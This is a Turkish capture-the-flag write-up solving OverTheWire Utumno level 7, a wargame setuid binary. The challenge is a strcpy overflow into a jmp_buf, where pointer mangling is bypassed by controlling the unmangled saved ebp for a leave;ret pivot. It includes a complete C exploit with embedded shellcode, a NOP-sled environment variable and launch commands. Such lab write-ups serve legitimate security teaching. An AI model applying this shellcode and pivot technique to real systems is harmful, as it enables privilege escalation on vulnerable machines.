# OverTheWire — Utumno Level 7 Çözümü (utumno7 → utumno8)  [SON SEVİYE]

> Hedef: `utumno7` kullanıcısından `utumno8` kullanıcısının şifresini elde etmek.
> Sonuç: **utumno8 şifresi = `**********`** (gizlendi) — **Utumno tamamlandı!**
> (maskelenmeyen `jmp_buf[3]=ebp` üzerinden `leave;ret` ile kontrol).

---

## 1. Bağlantı

```bash
ssh utumno7@utumno.labs.overthewire.org -p 2227
# şifre: **********   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
strings /utumno/utumno7
#   strcpy, _setjmp, longjmp, "lol ulrich && fuck hector"
#   ... -fno-stack-protector ...      <-- canary YOK
readelf -l /utumno/utumno7 | grep GNU_STACK      #   RWE -> stack EXECUTABLE
objdump -d ... | grep '<.*>:'    # fonksiyonlar: vuln, main, jmp
```

---

## 3. Statik Analiz

```c
void vuln(char *s) {
    char buf[?];                    // ebp-0x120
    jmp_buf jb;                     // ebp-0xa0   (buf'tan 0x80 ötede)
    global_jb = &jb;                // ds:0x804b260
    if (setjmp(jb) == 0) {
        strcpy(buf, s);             // s > 0x80 ise jb'yi ezer  <<< OVERFLOW
        jmp(23);                    // -> longjmp(global_jb, 23)
    }
    // longjmp buraya (setjmp sonrası, 0x80491cd) döner, ret=23 -> end -> leave;ret
}
void jmp(int v){ longjmp(global_jb, v); }
int main(int argc,char**argv){ if(argc<=1)exit(1); puts("lol ..."); vuln(argv[1]); }
```

- `buf = ebp-0x120`, `jmp_buf = ebp-0xa0` → aradaki mesafe **0x80** (128 bayt).
- `argv[1] > 128 bayt` ⇒ `strcpy` jmp_buf'u ezer.

### glibc jmp_buf (i386) düzeni
```
jmp_buf[0]=ebx  [1]=esi  [2]=edi  [3]=ebp        (DÜZ — maskelenmez)
         [4]=esp(MANGLED)  [5]=eip(MANGLED)
```
`longjmp`, `esp` ve `eip`'i **PTR_MANGLE** ile çözer: `demangled = ror(M,9) XOR guard`,
`guard = %gs:0x18` (pointer guard).

---

## 4. PTR_MANGLE Engeli ve Bypass

`eip`'i forge etmek için `M = rol(target XOR guard, 9)` lazım → **guard** gerekir.

**Deney:** `eip` alanına `0x47474747` yazıp 2 kez çalıştırdım, segfault adresleri:
```
run1: si_addr=0xf1026794
run2: si_addr=0xfb461455      <-- FARKLI => guard her exec'te RASTGELE
```
⇒ guard öğrenilemez/forge edilemez (AT_RANDOM'dan, ASLR kapalı olsa bile rastgele).

### Çözüm: ebp-pivot (mangle'a hiç dokunma)
`jmp_buf[3] = ebp` **maskelenmez**. Plan:
1. `eip`/`esp` alanlarını **EZME** → longjmp orijinal `eip`'e (`0x80491cd`) normal döner.
2. Sadece `jmp_buf[3]=ebp`'yi kontrol et.
3. `vuln` sonunda `leave; ret`:
   - `leave`: `esp = ebp; pop ebp`  → `esp = ebp+4`
   - `ret`: `eip = *(ebp+4)`   ⇒ **ebp+4'ün gösterdiği yere atla!**

Yani `ebp`'yi, `*(ebp+4) = shellcode_adresi` olacak bir yere koy.

**Anchor = EGG env** (adresi printer ile bilinir, stack buf adresi gerekmez):
EGG içine `... [junk(4)][sled_addr(4)]` "pivot" koy; `ebp = pivot_adresi`.
`leave;ret` → `eip = *(pivot+4) = sled_addr` → NOP sled → shellcode (`cat utumno8`).

> `argv[1] = 0x90` bayt: `0x80` dolgu + ebx + esi + edi + **ebp(pivot)**. Sonundaki NUL,
> `esp`-alanının low byte'ını bozar (zararsız — `leave` zaten `esp`'i `ebp` ile ezer; ayrıca
> binary `__longjmp_chk` değil düz `longjmp` kullanıyor, esp denetimi yok).
> `eip` alanı hiç yazılmaz → orijinal mangled değer kalır → `0x80491cd`'e temiz dönüş.

---

## 5. Final Exploit

### `ex7.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno8" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x38, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
#define GAP 1024
static char eggenv[4+SLED+200+GAP+16];
static char arg1[160];
static char *envp[2];
int main(int argc,char**argv){
 unsigned int env0=0xffff0000; int run=0;
 if(argc>=3 && !strcmp(argv[1],"run")){ env0=strtoul(argv[2],0,16); run=1; }
 char *d=eggenv+4; memcpy(eggenv,"EGG=",4);
 memset(d,0x90,SLED); memcpy(d+SLED,sc,sizeof sc); memset(d+SLED+sizeof sc,0x90,GAP);
 int pivot_off=SLED+sizeof sc+GAP;
 unsigned int egg=env0+4, sled_addr=egg+30000;
 *(unsigned int*)(d+pivot_off)=0x41414141;       /* popped into ebp (junk) */
 *(unsigned int*)(d+pivot_off+4)=sled_addr;       /* -> eip via ret */
 d[pivot_off+8]=0;
 envp[0]=eggenv; envp[1]=0;
 unsigned int pivot_addr=egg+pivot_off;
 memset(arg1,'A',0x80);
 *(unsigned int*)(arg1+0x80)=0x41414141;          /* ebx */
 *(unsigned int*)(arg1+0x84)=0x41414141;          /* esi */
 *(unsigned int*)(arg1+0x88)=0x41414141;          /* edi */
 *(unsigned int*)(arg1+0x8c)=pivot_addr;          /* ebp (UNMANGLED) */
 arg1[0x90]=0;
 if(!run){ char *av[]={"/tmp/q7Bn3kLm9z",arg1,0}; execve("/tmp/q7Bn3kLm9z",av,envp); }
 else { char *av[]={"/utumno/utumno7",arg1,0}; execve("/utumno/utumno7",av,envp); }
 perror("execve"); return 1;
}
```

### Çalıştırma
```bash
gcc -m32 -o ex7 ex7.c
gcc -m32 -o /tmp/q7Bn3kLm9z pr.c          # environ[0] yazıcı (taze 15-char path)
ENV0=$(./ex7 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
./ex7 run "$ENV0"
```

Çıktı:
```
ENV0=fffef117
lol ulrich && fuck hector
**********
```

---

## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **jmp_buf overflow** | `strcpy(buf, argv[1])` → 0x80 ötedeki `jmp_buf`'u ezer |
| **PTR_MANGLE** | glibc `setjmp/longjmp` esp+eip'i `ror/xor guard` ile maskeler; guard her exec rastgele |
| **Bypass = ebp-pivot** | `jmp_buf[3]=ebp` maskelenmez; eip/esp'e dokunma → `leave;ret` ile `eip=*(ebp+4)` |
| **EGG anchor** | ebp'yi env'deki pivot'a yönlendir → stack buf adresi gerekmez, sadece env adresi |
| **`longjmp` vs `__longjmp_chk`** | Düz `longjmp` esp denetimi yapmaz → bozuk esp sorun değil |


